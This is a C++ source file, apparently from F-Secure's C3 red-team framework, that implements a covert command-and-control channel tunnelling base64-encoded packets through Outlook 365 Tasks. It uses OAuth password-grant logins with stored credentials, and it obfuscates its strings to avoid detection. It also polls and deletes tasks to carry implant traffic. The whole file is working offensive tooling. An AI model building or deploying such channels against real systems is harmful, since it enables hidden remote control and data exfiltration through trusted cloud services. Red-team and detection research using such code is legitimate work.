#include "StdAfx.h"
#include "Outlook365RestTask.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/json/json.hpp"

// Namespaces.
using json = nlohmann::json;
using namespace utility::conversions;

std::atomic<std::chrono::steady_clock::time_point> FSecure::C3::Interfaces::Channels::Outlook365RestTask::s_TimePoint = std::chrono::steady_clock::now();

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Outlook365RestTask::Outlook365RestTask(ByteView arguments)
	: m_InboundDirectionName{ arguments.Read<std::string>() }
	, m_OutboundDirectionName{ arguments.Read<std::string>() }
{
	// Obtain proxy information and store it in the HTTP configuration.
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		m_HttpConfig.set_proxy(winProxy == OBF(L"auto") ? web::web_proxy::use_auto_discovery : web::web_proxy(winProxy));

	// Retrieve auth data.
	std::string username, password, clientKey, clientSecret;
	std::tie(username, password, clientKey, clientSecret) = arguments.Read<std::string, std::string, std::string, std::string>();
	m_Password = to_utf16string(password);
	FSecure::Utils::SecureMemzero(password.data(), password.size());

	web::http::oauth2::experimental::oauth2_config oauth2Config(
		to_utf16string(std::move(clientKey)),
		to_utf16string(std::move(clientSecret)),
		OBF(L"https://login.windows.net/common/oauth2/v2.0/authorize"),
		OBF(L"https://login.windows.net/organizations/oauth2/v2.0/token"),
		OBF(L""),
		OBF(L"https://outlook.office365.com/.default"),
		to_utf16string(username)
	);

	// Set the above configuration in the HTTP configuration for cpprestsdk (it already includes proxy information from the code above).
	m_HttpConfig.set_oauth2(std::move(oauth2Config));

	// For simplicity access token is not a configuration parameter. Refresh token will be used to generate first access token.
	RefreshAccessToken();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnSendToChannel(ByteView data)
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	try
	{
		// Construct the HTTP request
		web::http::client::http_client client(OBF(L"https://outlook.office.com/api/v2.0/me/tasks"), m_HttpConfig);
		web::http::http_request request(web::http::methods::POST);

		// For the JSON body, take a simple approach and use only the required fields.
		json jsonBody;
		jsonBody[OBF("Subject")] = m_OutboundDirectionName;
		jsonBody[OBF("Body")][OBF("Content")] = cppcodec::base64_rfc4648::encode(&data.front(), data.size());
		jsonBody[OBF("Body")][OBF("ContentType")] = OBF("Text");

		request.set_body(to_string_t(jsonBody.dump()));
		request.headers().set_content_type(OBF(L"application/json"));

		web::http::http_response response = client.request(request).get();

		if (response.status_code() != web::http::status_codes::Created)
		{
			if (response.status_code() == web::http::status_codes::TooManyRequests) // break and set sleep time.
			{
				s_TimePoint = std::chrono::steady_clock::now() + FSecure::Utils::GenerateRandomValue(10s, 20s);
				throw std::runtime_error{ OBF("Too many requests") };
			}
			if (response.status_code() == web::http::status_codes::Unauthorized)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("HTTP 401 - Token being refreshed") };

			}
			if (response.status_code() == web::http::status_codes::BadRequest)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("Bad Request") };
			}

			throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(response.status_code()) };
		}
	
		return data.size();
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnSend(): ") + exception.what(), LogMessage::Severity::Warning });
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnReceiveFromChannel()
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	std::vector<ByteVector> packets;
	try
	{
		// Construct request to get tasks.
		// Filtered by subjects that start with m_InboundDirectionName, order by oldest first, and fetch 1000 tasks.
		// Example: https://outlook.office.com/api/v2.0/me/tasks?top=1000&filter=startswith(Subject,'C2S')&orderby=CreatedDateTime
		std::string URLwithInboundDirection = OBF("https://outlook.office.com/api/v2.0/me/tasks?top=");
		URLwithInboundDirection += OBF("1000"); // number of tasks to fetch
		URLwithInboundDirection += OBF("&filter=startswith(Subject,'"); // filter by subject
		URLwithInboundDirection += m_InboundDirectionName; // subject should contain m_InboundDirectionName
		URLwithInboundDirection += OBF("')&orderby=CreatedDateTime"); // order by creation date (oldest first)
		web::http::client::http_client client(to_string_t(URLwithInboundDirection), m_HttpConfig);
		web::http::http_request request(web::http::methods::GET);

		web::http::http_response response = client.request(request).get();

		if (response.status_code() != web::http::status_codes::OK) // ==200
		{
			if (response.status_code() == web::http::status_codes::TooManyRequests) // break and set sleep time.
			{
				s_TimePoint = std::chrono::steady_clock::now() + std::chrono::seconds{ stoul(response.headers().find(OBF(L"Retry-After"))->second) };
				throw std::runtime_error{ OBF("Too many requests") };
			}

			if (response.status_code() == web::http::status_codes::Unauthorized)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("HTTP 401 - Token being refreshed") };

			}

			if (response.status_code() == web::http::status_codes::BadRequest)
			{
				RefreshAccessToken();
				throw std::runtime_error{ OBF("Bad Request") };
			}

			throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(response.status_code()) };
		}

		std::string responseString = response.extract_utf8string().get();

		// Gracefully handle situation where there's an empty JSON value (e.g., a failed request)
		if (responseString.empty())
			return {};

		// Convert response (as string_t to utf8) and parse.
		json taskDataAsJSON;
		try
		{
			taskDataAsJSON = json::parse(responseString);
		}
		catch (json::parse_error& err)
		{
			Log({ OBF("Failed to parse the list of received tasks."), LogMessage::Severity::Error });
			return {};
		}

		for (auto& element : taskDataAsJSON.at(OBF("value")))
		{
			// Obtain subject and task ID.
			std::string subject = element.at(OBF("Subject")).get<std::string>();
			std::string id = element.at(OBF("Id")).get<std::string>();

			// Verify that the full subject and ID were obtained.  If not, ignore.
			if (subject.empty() || id.empty())
				continue;

			// Check the direction component is at the start of subject.
			if (subject.find(m_InboundDirectionName))
				continue;

			try
			{
				// Send the (decoded) message's body.
				ByteVector packet = cppcodec::base64_rfc4648::decode(element.at(OBF("Body")).at(OBF("Content")).get<std::string>());
				packets.emplace_back(packet);
				SCOPE_GUARD(RemoveTask(id); );
			}
			catch (const cppcodec::parse_error& exception)
			{
				Log({ OBF("Error decoding task #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
			}
			catch (std::exception& exception)
			{
				Log({ OBF("Caught a std::exception when processing task #") + id + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
			}
		}
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnReceive(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return packets;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Outlook365RestTask::RemoveAllTasks(ByteView)
{
	try
	{
		// Construct request. One minor limitation of this is that it will remove 1000 tasks only (the maximum of "top"). This could be paged.
		auto client = web::http::client::http_client{ OBF(L"https://outlook.office.com/api/v2.0/me/tasks?$top=1000"), m_HttpConfig };

		web::http::http_response response = client.request({ web::http::methods::GET }).get();

		if (response.status_code() != web::http::status_codes::OK)
		{
			Log({ OBF("RemoveAllFiles() Error.  Files could not be deleted. Confirm access and refresh tokens are correct."), LogMessage::Severity::Error });
			return {};
		}

		// Parse response (list of tasks)
		auto taskDataAsJSON = nlohmann::json::parse(to_utf8string(response.extract_utf8string().get()));

		// For each task (under the "value" key), extract the ID, and send a request to delete the task.
		for (auto& element : taskDataAsJSON.at(OBF("value")))
			RemoveTask(element.at(OBF("id")).get<std::string>());
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running RemoveAllTasks(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Outlook365RestTask::RemoveTask(std::string const& id)
{
	// There is a minor logic flaw in this part of the code, as it assumes the access token is still valid, which may not be the case.
	auto URLwithID = OBF("https://outlook.office.com/api/v2.0/me/tasks('") + id + OBF("')");
	auto client = web::http::client::http_client{ to_string_t(URLwithID), m_HttpConfig };
	web::http::http_response response = client.request({ web::http::methods::DEL }).get();

	if (response.status_code() > 205)
		Log({ OBF("RemoveTask() Error. Task could not be deleted. HTTP response:") + std::to_string(response.status_code()), LogMessage::Severity::Error });
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Outlook365RestTask::RefreshAccessToken()
{
	try
	{
		auto oa2 = m_HttpConfig.oauth2();
		auto client = web::http::client::http_client(oa2->token_endpoint(), m_HttpConfig);
		auto request = web::http::http_request(web::http::methods::POST);
		request.headers().set_content_type(OBF(L"application/x-www-form-urlencoded"));
		auto requestBody = ""s;
		requestBody += OBF("grant_type=password");
		requestBody += OBF("&scope=");
		requestBody += to_utf8string(oa2->scope());
		requestBody += OBF("&username=");
		requestBody += to_utf8string(oa2->user_agent());
		requestBody += OBF("&password=");
		requestBody += to_utf8string(*m_Password.decrypt());
		requestBody += OBF("&client_id=");
		requestBody += to_utf8string(oa2->client_key());
		if (!oa2->client_secret().empty())
		{
			requestBody += OBF("&client_secret=");
			requestBody += to_utf8string(oa2->client_secret());
		}

		request.set_body(requestBody);
		FSecure::Utils::SecureMemzero(requestBody.data(), requestBody.size());

		web::http::http_response response = client.request(request).get();

		if (response.status_code() != web::http::status_codes::OK)
			throw std::runtime_error{ OBF("Refresh access token request - non-200 status code was received: ") + std::to_string(response.status_code()) };

		// If successful, parse the useful information from the response.
		auto taskDataAsJSON = nlohmann::json::parse(to_utf8string(response.extract_utf8string().get()));

		auto tokenCopy = oa2->token();
		tokenCopy.set_access_token(to_string_t(taskDataAsJSON.at(OBF("access_token")).get<std::string>()));
		tokenCopy.set_expires_in(taskDataAsJSON.at(OBF("expires_in")).get<std::int64_t>());
		oa2->set_token(tokenCopy);
	}
	catch (std::exception& exception)
	{
		throw std::runtime_error{ OBF_STR("Cannot refresh token: ") + exception.what() };
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		return RemoveAllTasks(command);
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteView FSecure::C3::Interfaces::Channels::Outlook365RestTask::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Username",
				"min": 1,
				"description": "User with Office 365 subscription."
			},
			{
				"type": "string",
				"name": "Password",
				"min": 1,
				"description": "User password."
			},
			{
				"type": "string",
				"name": "Client key",
				"min": 1,
				"description": "Identifies the application (e.g. a GUID). User, or user admin must give consent for application to work in user context."
			},
			{
				"type": "string",
				"name": "Client secret",
				"description": "Leave empty if not required."
			}
		]
	},
	"commands":
	[
		{
			"name": "Remove all tasks",
			"id": 0,
			"description": "Clearing old tasks from server may increase bandwidth",
			"arguments": []
		}
	]
}
)_";
}

